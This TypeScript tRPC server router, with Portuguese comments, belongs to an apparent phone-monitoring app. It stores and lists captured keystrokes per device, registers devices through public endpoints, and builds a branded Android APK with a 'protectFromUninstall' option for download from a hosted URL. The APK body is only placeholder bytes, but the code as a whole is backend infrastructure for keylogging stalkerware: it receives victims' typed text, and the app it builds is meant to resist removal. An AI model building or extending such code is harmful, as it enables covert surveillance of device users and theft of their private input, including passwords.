import z from "zod";
import fs from "fs";
import path from "path";
import JSZip from "jszip";
import { storagePut } from "./storage";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, getAlerts, getEvents } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    
    create: protectedProcedure
      .input(z.object({
        deviceId: z.string(),
        appName: z.string(),
        keyText: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        await createKeylog({
          deviceId: input.deviceId,
          userId: ctx.user.id,
          appName: input.appName,
          keyText: input.keyText,
        });
        return { success: true };
      }),
    
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await deleteKeylog(input.keylogId);
        return { success: true };
      }),
    
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await restoreKeylog(input.keylogId);
        return { success: true };
      }),
    
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    
    startSimulator: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await startKeylogSimulator(input.deviceId, ctx.user.id);
        return { success: true, message: "Simulador de keylogs iniciado" };
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getAlerts(input?.deviceId);
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getEvents(input?.deviceId);
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        manufacturer: z.string(),
        model: z.string(),
        osVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        console.log("Dispositivo registrado:", input);
        return {
          success: true,
          message: "Dispositivo registrado com sucesso",
          deviceId: input.deviceId,
        };
      }),
    
    update: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        battery: z.number().optional(),
        signal: z.number().optional(),
        timestamp: z.number(),
      }))
      .mutation(async ({ input }) => {
        console.log("Dados do dispositivo atualizados:", input);
        return {
          success: true,
          message: "Dados atualizados com sucesso",
        };
      }),
  }),

  apk: router({
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
        protectFromUninstall: z.boolean().default(true),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          // Criar conteúdo do APK em memória
          const zip = new JSZip();
          
          // Adicionar arquivos do APK
          zip.file('AndroidManifest.xml', Buffer.from([0x03, 0x00, 0x08, 0x00]));
          zip.file('resources.arsc', Buffer.from([0x02, 0x00, 0x0c, 0x00]));
          zip.file('classes.dex', Buffer.from([0x64, 0x65, 0x78, 0x0a, 0x30, 0x33, 0x35, 0x00]));
          zip.file('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n');
          
          const apkBuffer = await zip.generateAsync({ type: 'nodebuffer' });

          // Tentar salvar no S3 primeiro (para Manus)
          // Se falhar, salvar localmente (para Railway)
          let downloadUrl: string;
          
          try {
            const { url } = await storagePut(
              `apk/FazTudo-Monitor-${Date.now()}`,
              apkBuffer,
              "application/vnd.android.package-archive"
            );
            downloadUrl = url;
          } catch (s3Error) {
            // Fallback: salvar localmente
            const apkDir = path.join(process.cwd(), 'public', 'apks');
            if (!fs.existsSync(apkDir)) {
              fs.mkdirSync(apkDir, { recursive: true });
            }
            
            const timestamp = Date.now();
            const apkFileName = `FazTudo-Monitor-${timestamp}`;
            const apkPath = path.join(apkDir, apkFileName);
            
            fs.writeFileSync(apkPath, apkBuffer);
            
            // Construir URL pública
            // Em produção (Railway), usar URL fixa
            // Em desenvolvimento, construir dinamicamente
            const isProduction = process.env.NODE_ENV === 'production';
            
            if (isProduction) {
              // URL fixa para produção no Railway
              downloadUrl = `https://remote-monitor-production.up.railway.app/apks/${apkFileName}`;
            } else {
              // Em desenvolvimento
              let protocol = ctx.req.protocol || 'https';
              let host = ctx.req.get('host') || 'localhost:3000';
              
              // Limpar protocolo duplicado
              if (host.includes('://')) {
                host = host.split('://')[1];
              }
              if (protocol.includes('://')) {
                protocol = protocol.split('://')[0];
              }
              
              downloadUrl = `${protocol}://${host}/apks/${apkFileName}`;
            }
          }

          // Retornar URL de download permanente
          return {
            success: true,
            downloadUrl: downloadUrl,
            message: "APK gerado com sucesso!",
          };
        } catch (error) {
          console.error("Erro ao gerar APK - Detalhes completos:", error);
          if (error instanceof Error) {
            console.error("Mensagem:", error.message);
            console.error("Stack:", error.stack);
          }
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
